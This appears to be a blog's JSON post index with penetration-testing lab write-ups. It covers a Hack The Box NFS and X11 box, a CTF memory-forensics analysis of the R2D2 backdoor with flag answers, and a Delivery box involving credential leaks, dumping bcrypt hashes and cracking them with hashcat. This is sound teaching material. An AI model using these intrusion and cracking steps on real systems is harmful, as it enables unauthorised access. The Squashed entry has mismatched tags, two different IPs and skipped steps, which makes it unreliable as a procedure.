[
  
  {
    "title": "Squashead - Hack The Box",
    "url": "/posts/htb-Squashed/",
    "categories": "hackthebox",
    "tags": "osticket, mysql, mattermost, hashcat, rules",
    "date": "2022-11-25 00:00:00 +0800",
    





    
    "snippet": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveragingmisconfigurations in NFS shares through impersonating users. Additionally, the box incorpo...",
    "content": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveragingmisconfigurations in NFS shares through impersonating users. Additionally, the box incorporates theenumeration of an X11 display into the privilege escalation by having the attacker take a screenshot of thecurrent Desktop.EnumarationPort Scannmap -sC -sV 10.10.11.191Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 11:12 ISTNmap scan report for 10.10.11.191Host is up (0.13s latency).Not shown: 996 closed tcp ports (conn-refused)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Built Better|_http-server-header: Apache/2.4.41 (Ubuntu)111/tcp  open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3           2049/udp   nfs|   100003  3           2049/udp6  nfs|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      45669/tcp6  mountd|   100005  1,2,3      50287/udp6  mountd|   100005  1,2,3      53317/tcp   mountd|   100005  1,2,3      54473/udp   mountd|   100021  1,3,4      33785/tcp6  nlockmgr|   100021  1,3,4      34763/tcp   nlockmgr|   100021  1,3,4      39022/udp   nlockmgr|   100021  1,3,4      50677/udp6  nlockmgr|   100227  3           2049/tcp   nfs_acl|   100227  3           2049/tcp6  nfs_acl|   100227  3           2049/udp   nfs_acl|_  100227  3           2049/udp6  nfs_acl2049/tcp open  nfs_acl 3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.97 secondsThe nmap scan shows a standard SSH service running on port 22 , an Apache webserver running on port80 , as well as NFS and rpcbind running on their default portsEnumerating NFSNFS is a server/client  system enabling users to share files and directories across a network and allowingthose shares to be mounted locally. While both useful and versatile, NFS has no protocol for authorizationor authentication, making it a common pitfall for misconfiguration and therefore exploitation.We begin our enumeration by listing any potentially available shares hosted on the target machine.  showmount -e squashed.htbPort 22No anon login allowed so let’s move on.Port 80several html pages with nothing interesting. No subdirs, no subdomains.we see the how Beutifull Website developer made$ showmont -e 10.10.11.191Export list for 10.10.11.191/home/ross */var/www/html *Since we already saw whats in /html let’s dig into home folder first      sudo mount -t nfs 10.129.228.109:/home/ross    ~/Documents/htb/squashed -o nolock└─$ dir -lahtotal 68Kdrwxr-xr-x 14 ftpuser ftpgroup 4.0K Nov 19 09:21 .drwxr-xr-x 33 kali kali 4.0K Nov 19 09:20 ..lrwxrwxrwx 1 root root 9 Oct 20 09:24 .bash_history -&gt; /dev/nulldrwx - - - 11 ftpuser ftpgroup 4.0K Oct 21 10:57 .cachedrwx - - - 12 ftpuser ftpgroup 4.0K Oct 21 10:57 .configdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Desktopdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Documentsdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Downloadsdrwx - - - 3 ftpuser ftpgroup 4.0K Oct 21 10:57 .gnupgdrwx - - - 3 ftpuser ftpgroup 4.0K Oct 21 10:57 .localdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Musicdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Picturesdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Publicdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Templatesdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Videoslrwxrwxrwx 1 root root 9 Oct 21 09:07 .viminfo -&gt; /dev/null-rw - - - - 1 ftpuser ftpgroup 57 Nov 19 09:21 .Xauthority-rw - - - - 1 ftpuser ftpgroup 2.5K Nov 19 09:21 .xsession-errors-rw - - - - 1 ftpuser ftpgroup 2.5K Oct 31 06:13 .xsession-errors.oldDocuments contains a Passwords.kdbx, a keepass password databaseWhen listing the contents of /var/www/html , which is now mounted at /mnt/1 , it becomes evident thatwhile we can see filenames, we cannot see the files’ owners or permissions. That also means we cannotread the files’ contents or modify them whatsoever. We can, however, check the actual directory’spermissions by running ls on the folder itself.ls -ld /mnt/1We can see that the directory is owned by the UID 2017, and belongs to the group with the ID of www-data ,or 33 . This means that on the target box, i.e the server hosting the share, the directory is owned by a userwith that specific UID. We proceed to the second sharesudo mount -t nfs squashed.htb:/home/ross /mnt/2Following the blog we exfiltrate the cookie from our mounted share to our local attackbox and reupload it so we can use it with our alex user. Remember, we want to steal the session of ross so we have to do this on the victim.After trying xrdp for a while I checked the other xtools. https://clearlinux.org/software/bundle/x11-toolsxwd allows us to take a screenshot of the current session, this is a good start.we found the password root  cah$mei7rai9Aso we can connect with ssh"
  },
  
  {
    "title": "R2D2 Backdoor - Memory Forensics",
    "url": "/posts/CyberConFinals/",
    "categories": "CTF-TIME",
    "tags": "volatility, r2d2 backdoor",
    "date": "2022-11-15 00:00:00 +0800",
    





    
    "snippet": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional tea...",
    "content": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional teams and 10 University teams battled out different challenges ranging from: Web, Forensics, Pwn, Reverse Engineering. Anyway, i didn’t have enough time to properly setup a challenge from scratch, so i resolved to create some questions on a memory sample containing some nasty backdoor i was analyzing sometime back. I was happy to see folks solve most of the challenges and almost comming to the same conclusion i had before. With that said, i will be sharing my thought process on how the challenges were meant to be solved.So, what is a memory dump? Simply put, a memory dump (also known as a core dump or system dump) is a snapshot capture of computer memory data from a specific instant. A memory dump can contain valuable forensics data about the state of the system before an incident such as a crash or security compromise.  Memory forensics can provide unique insights into runtime system activity, including open network connections and recently executed commands or processes. In many cases, critical data pertaining to attacks or threats will exist solely in system memory – examples include network connections, account credentials, chat messages, encryption keys, running processes, injected code fragments, and internet history which is non-cacheable. Any program – malicious or otherwise – must be loaded in memory in order to execute, making memory forensics critical for identifying otherwise obfuscated attacks. ~Source: DigitalGuardianFirst, you unzip the provided memory sample. Password: infectedTo answer the first question, you were only required to get the md5sum of the .vmem file. This was as easy as:➜  md5sum malware.vmemcb47af710c7ab59e43d1396aa7ce950c  malware.vmemMoving on, we can use a tool like volatility to analyze the memory dump.Other tools you can explore on memory forensics include:  Rekall Framework  RedlineFirst, you need to find more information about the dump you are analying such as the image profile to use. To do so, you can use the imageinfo plugin or kdbgscan.➜  python2 vol.py -f malware.vmem imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/CyberCON/malware.vmem)                      PAE type : PAE                           DTB : 0x319000L                          KDBG : 0x80544ce0L          Number of Processors : 1     Image Type (Service Pack) : 2                KPCR for CPU 0 : 0xffdff000L             KUSER_SHARED_DATA : 0xffdf0000L           Image date and time : 2011-10-10 17:06:54 UTC+0000     Image local date and time : 2011-10-10 13:06:54 -0400With that determined, you can begin investigating the processes running on the target system by using the pslist plugin.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pslistVolatility Foundation Volatility Framework 2.6.1Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0x819cc830 System                    4      0     55      162 ------      00x81945020 smss.exe                536      4      3       21 ------      0 2011-10-10 17:03:56 UTC+00000x816c6020 csrss.exe               608    536     11      355      0      0 2011-10-10 17:03:58 UTC+00000x813a9020 winlogon.exe            632    536     24      533      0      0 2011-10-10 17:03:58 UTC+00000x816da020 services.exe            676    632     16      261      0      0 2011-10-10 17:03:58 UTC+00000x813c4020 lsass.exe               688    632     23      336      0      0 2011-10-10 17:03:58 UTC+00000x81772ca8 vmacthlp.exe            832    676      1       24      0      0 2011-10-10 17:03:59 UTC+00000x8167e9d0 svchost.exe             848    676     20      194      0      0 2011-10-10 17:03:59 UTC+00000x817757f0 svchost.exe             916    676      9      217      0      0 2011-10-10 17:03:59 UTC+00000x816c6da0 svchost.exe             964    676     63     1058      0      0 2011-10-10 17:03:59 UTC+00000x815daca8 svchost.exe            1020    676      5       58      0      0 2011-10-10 17:03:59 UTC+00000x813aeda0 svchost.exe            1148    676     12      187      0      0 2011-10-10 17:04:00 UTC+00000x817937e0 spoolsv.exe            1260    676     13      140      0      0 2011-10-10 17:04:00 UTC+00000x81754990 VMwareService.e        1444    676      3      145      0      0 2011-10-10 17:04:00 UTC+00000x8136c5a0 alg.exe                1616    676      7       99      0      0 2011-10-10 17:04:01 UTC+00000x815c4da0 wscntfy.exe            1920    964      1       27      0      0 2011-10-10 17:04:39 UTC+00000x813bcda0 explorer.exe           1956   1884     18      322      0      0 2011-10-10 17:04:39 UTC+00000x816d63d0 VMwareTray.exe          184   1956      1       28      0      0 2011-10-10 17:04:41 UTC+00000x8180b478 VMwareUser.exe          192   1956      6       83      0      0 2011-10-10 17:04:41 UTC+00000x818233c8 reader_sl.exe           228   1956      2       26      0      0 2011-10-10 17:04:41 UTC+00000x815e7be0 wuauclt.exe             400    964      8      173      0      0 2011-10-10 17:04:46 UTC+00000x817a34b0 cmd.exe                 544   1956      1       30      0      0 2011-10-10 17:06:42 UTC+0000No process looks suspicious at this point. We can take this a notch higher and use the pstree plugin to print process list as a tree. This would make you understand which process triggered other processes.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pstreeVolatility Foundation Volatility Framework 2.6.1Name                                                  Pid   PPid   Thds   Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0x819cc830:System                                      4      0     55    162 1970-01-01 00:00:00 UTC+0000. 0x81945020:smss.exe                                 536      4      3     21 2011-10-10 17:03:56 UTC+0000.. 0x816c6020:csrss.exe                               608    536     11    355 2011-10-10 17:03:58 UTC+0000.. 0x813a9020:winlogon.exe                            632    536     24    533 2011-10-10 17:03:58 UTC+0000... 0x816da020:services.exe                           676    632     16    261 2011-10-10 17:03:58 UTC+0000.... 0x817757f0:svchost.exe                           916    676      9    217 2011-10-10 17:03:59 UTC+0000.... 0x81772ca8:vmacthlp.exe                          832    676      1     24 2011-10-10 17:03:59 UTC+0000.... 0x816c6da0:svchost.exe                           964    676     63   1058 2011-10-10 17:03:59 UTC+0000..... 0x815c4da0:wscntfy.exe                         1920    964      1     27 2011-10-10 17:04:39 UTC+0000..... 0x815e7be0:wuauclt.exe                          400    964      8    173 2011-10-10 17:04:46 UTC+0000.... 0x8167e9d0:svchost.exe                           848    676     20    194 2011-10-10 17:03:59 UTC+0000.... 0x81754990:VMwareService.e                      1444    676      3    145 2011-10-10 17:04:00 UTC+0000.... 0x8136c5a0:alg.exe                              1616    676      7     99 2011-10-10 17:04:01 UTC+0000.... 0x813aeda0:svchost.exe                          1148    676     12    187 2011-10-10 17:04:00 UTC+0000.... 0x817937e0:spoolsv.exe                          1260    676     13    140 2011-10-10 17:04:00 UTC+0000.... 0x815daca8:svchost.exe                          1020    676      5     58 2011-10-10 17:03:59 UTC+0000... 0x813c4020:lsass.exe                              688    632     23    336 2011-10-10 17:03:58 UTC+0000 0x813bcda0:explorer.exe                             1956   1884     18    322 2011-10-10 17:04:39 UTC+0000. 0x8180b478:VMwareUser.exe                           192   1956      6     83 2011-10-10 17:04:41 UTC+0000. 0x817a34b0:cmd.exe                                  544   1956      1     30 2011-10-10 17:06:42 UTC+0000. 0x816d63d0:VMwareTray.exe                           184   1956      1     28 2011-10-10 17:04:41 UTC+0000. 0x818233c8:reader_sl.exe                            228   1956      2     26 2011-10-10 17:04:41 UTC+0000At this point we see explorer.exe (PID: 1956) spawning VMwareUser.exe , cmd.exe ( Suspicious) , VMwareTray.exe &amp; reader_sl.exe ( Suspicious). My thinking, The user probably opened a malicious pdf file that spawned cmd and finally Adobe reader to view it. We can use the cmdscan plugin to extract command history as shown:➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 cmdscanVolatility Foundation Volatility Framework 2.6.1**************************************************CommandProcess: csrss.exe Pid: 608CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 @ 0x4e1eb8: sc query malwarCmd #1 @ 0x11135e8: sc query malwareWe see sc query malware command was executed.  The sc command is used to configure, query, stop, start, delete, and add system services on the Windows command line.In our case, the command seems to be querying a service called malware. The first command entry looks like a typo though.Similar to cmdscan the consoles plugin finds commands that attackers typed into cmd.exe or executed via backdoors. The major advantage to this plugin is it not only prints the commands attackers typed, but it collects the entire screen buffer (input and output). For instance, lets see what output was generated when sc query malware command was executed.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 consolesVolatility Foundation Volatility Framework 2.6.1**************************************************ConsoleProcess: csrss.exe Pid: 608Console: 0x4e2370 CommandHistorySize: 50HistoryBufferCount: 2 HistoryBufferMax: 4OriginalTitle: %SystemRoot%\\system32\\cmd.exeTitle: C:\\WINDOWS\\system32\\cmd.exeAttachedProcess: cmd.exe Pid: 544 Handle: 0x4c4----CommandHistory: 0x1113498 Application: sc.exe Flags:CommandCount: 0 LastAdded: -1 LastDisplayed: -1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x0----CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 at 0x4e1eb8: sc query malwarCmd #1 at 0x11135e8: sc query malware----Screen 0x4e2a70 X:80 Y:300Dump:Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;sc query malwar[SC] EnumQueryServicesStatus:OpenService FAILED 1060:The specified service does not exist as an installed service.C:\\Documents and Settings\\Administrator&gt;sc query malwareSERVICE_NAME: malware        TYPE               : 1  KERNEL_DRIVER        STATE              : 4  RUNNING                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0C:\\Documents and Settings\\Administrator&gt;More information about the service can be queried using the svcscan plugin. This plugin gives more detail to the running processes in the event that the analyst requires additional details such as the display name, binary path, or service type.We see that the service is running. Next thing we can try establish if there were network connections. Using connscan plugin, we see➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 connscanVolatility Foundation Volatility Framework 2.6.1Offset(P)  Local Address             Remote Address            Pid---------- ------------------------- ------------------------- ---0x01a25a50 0.0.0.0:1026              172.16.98.1:6666          1956We can detect listening sockets for any protocol (TCP, UDP, RAW, etc), using the sockets plugin.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 socketsVolatility Foundation Volatility Framework 2.6.1Offset(V)       PID   Port  Proto Protocol        Address         Create Time---------- -------- ------ ------ --------------- --------------- -----------0x8177e3c0     1956   1026      6 TCP             0.0.0.0         2011-10-10 17:04:39 UTC+00000x81596a78      688    500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x8166a008      964   1029     17 UDP             127.0.0.1       2011-10-10 17:04:42 UTC+00000x818ddc08        4    445      6 TCP             0.0.0.0         2011-10-10 17:03:55 UTC+00000x818328d8      916    135      6 TCP             0.0.0.0         2011-10-10 17:03:59 UTC+00000x81687e98     1616   1025      6 TCP             127.0.0.1       2011-10-10 17:04:01 UTC+00000x817517e8      964    123     17 UDP             127.0.0.1       2011-10-10 17:04:00 UTC+00000x81753b20      688      0    255 Reserved        0.0.0.0         2011-10-10 17:04:00 UTC+00000x8174fe98     1148   1900     17 UDP             127.0.0.1       2011-10-10 17:04:41 UTC+00000x81753008      688   4500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x816118d8        4    445     17 UDP             0.0.0.0         2011-10-10 17:03:55 UTC+0000Moving on, there was a question asking about the computer name and OS version. This information can be found using the envars plugin. Typically this will show the number of CPUs installed and the hardware architecture (though the kdbgscan output is a much more reliable source), the process’s current directory, temporary directory, session name, computer name, user name, and various other interesting artifacts.But what really triggered PID 1956? My hypothesis was that the user opened suspicious PDF documents that led to cmd &amp; Adobe reader spawning. We also saw a network connection linked to this process. Using the iehistory plugin we can recover fragments of IE history index.dat cache files. It can find basic accessed links (via FTP or HTTP), redirected links (–REDR), and deleted entries (–LEAK). It applies to any process which loads and uses the wininet.dll library, not just Internet Explorer. Typically that includes Windows Explorer and even malware samples. For more info about the same, you can read this blog postFrom the above, we see two suspicious pdf documents linked to the same process: listener.pdf &amp; Exploit.pdfLets scan for malicious drivers loaded, and moreso any that contains the malware string or name.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 driverscan | grep \"malware\"Volatility Foundation Volatility Framework 2.6.1Offset(P)          #Ptr #Hnd Start                            Size Service Key          Name         Driver Name------------------ ---- ---- ------------------ ------------------ -------------------- ------------ -----------0x0000000001a498b8        3        0 0xf9eb4000     0x1500 malware              malware      \\Driver\\malwareTo extract a kernel driver to a file, use the moddump pluggin. Supply the output directory with -D or –dump-dir=DIR.➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0xf9eb4000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x0f9eb4000 winsys32.sys         OK: driver.f9eb4000.sysWe can get its md5sum and check if its flagged by VT➜  md5sum driver.f9eb4000.sys63270d2354695cabde0baeb0aed60e2a  driver.f9eb4000.sysFrom the VT - driver.f9eb4000.sys Analysis, we find 53/71 vendors flagged this file as malicious. We also learn that it linked with R2D2 backdoor.Running strings on the malicious driver, we find another interesting dll referenced. Doing a quick google search on the same, we still get hits on R2D2 backdoor.Lets find out if the dll is used by explorer.exe. To display a process’s loaded DLLs, use the dlllist plugin with the -p or --pid filter as shown below.From the output shown above, we see mfc42ul.dll has a wierd base address compared to the rest (0x10000000). What we can do is extract the DLL from the process’s memory space and dump it to disk for analysis as shown below:➜  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0x10000000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x010000000 UNKNOWN              OK: driver.10000000.sys➜  md5sum driver.10000000.sys4986f678160ccd516f2bd589719ea0c4  driver.10000000.sysDoing a quick check on VirusTotal, we see 46/68 flagged this file as malicious.I did some research on this backdoor and came across this report by the Chaos Computer Club (CCC), a long-established German hacker group that claimed that the German government may have unleashed a backdoor Trojan Horse program, allowing them to spy on its people. While running strings on the suspicious dll (mfc42ul.dll), i noticed some wierd string, C3PO-r2d2-POE. Starwars characters? I don’t know.From CCC’s report, i learnt that the backdoor was dubbed “R2D2” due to the “C3PO-r2d2-POE” string located inside the Trojan. CCC claims that it allows the monitoring Internet activity, including the recording of MSN Messenger conversations, Skype calls and Yahoo messenger chat.That wraps up my analysis of the R2D2 backdoor, atleast for the context of the CTF. Upon completion of my analysis, I stumbled upon several blog posts documenting analysis of the same sample. Please check them out!  Invoke-IR - R2D2 Memory Sample Analysis   ka1d0 - Analyzing Memory Dumps — R2D2 Malware  Skills that matter - Hunting R2D2 Malware  evild3ad - Federal Trojan aka R2D2If anyone has additional details that i might have missed, or has any feedback to improve my methodology it would be greatly appreciated.Questions  What is the md5sum of the memory sample (50pts)ccke{cb47af710c7ab59e43d1396aa7ce950c}  What is the computer name of the machine captured (50pts)ccke{GENERALLEE}  What is the name of the OS from which the memory sample was captured from? (50pts)ccke{Windows_NT}  What process triggered a series of suspicious processes? (50pts)ccke{1956}  What Remote Address and Port was the victim machine communicating with? (50pts)ccke{172.16.98.1:6666}  There are two suspicious PDFs that were likely opened. Can you find their names? (50pts)ccke{listener.pdf,Exploit.pdf}  What is the md5sum of the malicious dll? (300pts)ccke{4986f678160ccd516f2bd589719ea0c4}  What is the md5sum of the malicious driver? (300pts)ccke{63270d2354695cabde0baeb0aed60e2a}  What is the name of this backdoor? (100pts)ccke{R2D2} or ccke{r2d2}"
  },
  
  {
    "title": "Delivery - Hack The Box",
    "url": "/posts/htb-writeup-delivery/",
    "categories": "hackthebox, infosec",
    "tags": "osticket, mysql, mattermost, hashcat, rules",
    "date": "2021-05-22 00:00:00 +0800",
    





    
    "snippet": "Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform ...",
    "content": "Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we’ll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we’ll use hashcat combined with rules to crack the password then get the root shell.PortscanNmap scan report for 10.129.148.141Host is up (0.018s latency).Not shown: 65532 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)80/tcp   open  http    nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Welcome8065/tcp open  unknown| fingerprint-strings: |   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: |     HTTP/1.1 400 Bad Request|     Content-Type: text/plain; charset=utf-8|     Connection: close|     Request|   GetRequest: |     HTTP/1.0 200 OK|     Accept-Ranges: bytes|     Cache-Control: no-cache, max-age=31556926, public|     Content-Length: 3108|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com|     Content-Type: text/html; charset=utf-8|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT|     X-Frame-Options: SAMEORIGIN|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false|     Date: Sun, 09 May 2021 00:01:31 GMT|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"&gt;&lt;meta name=\"robots\" content=\"noindex, nofollow\"&gt;&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=\"mobile-web-app-capable\" content=\"yes\"&gt;&lt;meta name=\"application-name\" content=\"Mattermost\"&gt;&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;&lt;link re|   HTTPOptions: |     HTTP/1.0 405 Method Not Allowed|     Date: Sun, 09 May 2021 00:01:31 GMT|_    Content-Length: 0WebsiteThe Delivery website is pretty basic, there’s a link to a vhost called helpdesk.delivery.htb and a contact us section. We’ll add this entry to our local host before proceeding further.The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.Browsing to port 8065 we get the MatterMost login page but we don’t have credentials yetHelpdeskThe Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.We can still open new tickets even if we only have a guest user.After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.Now that we have an email account we can create a MatterMost account.A confirmation email is then sent to our ticket status inbox.We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.We’re now logged in and we see that the MatterMost confirmation email has been added to the ticket information.To confirm the creation of our account we’ll just copy/paste the included link into a browser new tab.After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There’s also a hint that we’ll have to use a variation of the PleaseSubscribe! password later.User shellWith the maildeliverer / Youve_G0t_Mail! credentials we can SSH in and get the user flag.Credentials in MySQL databaseAfter doing some recon we find the MatterMost installation directory in /opt/mattermost:maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermostmatterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermostThe config.json file contains the password for the MySQL database:[...]\"SqlSettings\": {        \"DriverName\": \"mysql\",        \"DataSource\": \"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\",[...]We’ll connect to the database server and poke around.maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MariaDB connection id is 91Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mattermost         |+--------------------+MatterMost user accounts are stored in the Users table and hashed with bcrypt. We’ll save the hashes then try to crack them offline.MariaDB [(none)]&gt; use mattermost;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mattermost]&gt; select Username,Password from Users;+----------------------------------+--------------------------------------------------------------+| Username                         | Password                                                     |+----------------------------------+--------------------------------------------------------------+| surveybot                        |                                                              || c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK || 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G || root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO || snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa || ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq || channelexport                    |                                                              || 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |+----------------------------------+--------------------------------------------------------------+8 rows in set (0.002 sec)Cracking with rulesThere was a hint earlier that some variation of PleaseSubscribe! is used.I’ll use hashcat for this and since I don’t know the hash ID for bcrypt by heart I can find it in the help.C:\\bin\\hashcat&gt;hashcat --help | findstr bcrypt   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating SystemMy go-to rules is normally one of those two ruleset:  https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule  https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.ruleThese will perform all sort of transformations on the wordlist and we can quickly crack the password: PleaseSubscribe!21C:\\bin\\hashcat&gt;hashcat -a 0 -m 3200 -w 3 -O -r rules\\_NSAKEY.v2.dive.rule hash.txt wordlist.txt[...]$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21Session..........: hashcatStatus...........: CrackedHash.Name........: bcrypt $2*$, Blowfish (Unix)[...]The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag."
  },
  
  {
    "title": "Ready - Hack The Box",
    "url": "/posts/htb-writeup-ready/",
    "categories": "hackthebox, infosec",
    "tags": "linux, gitlab, cve, docker, privileged container",
    "date": "2021-05-15 00:00:00 +0800",
    





    
    "snippet": "Ready was a pretty straighforward box to get an initial shell on: We identify that’s it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once in...",
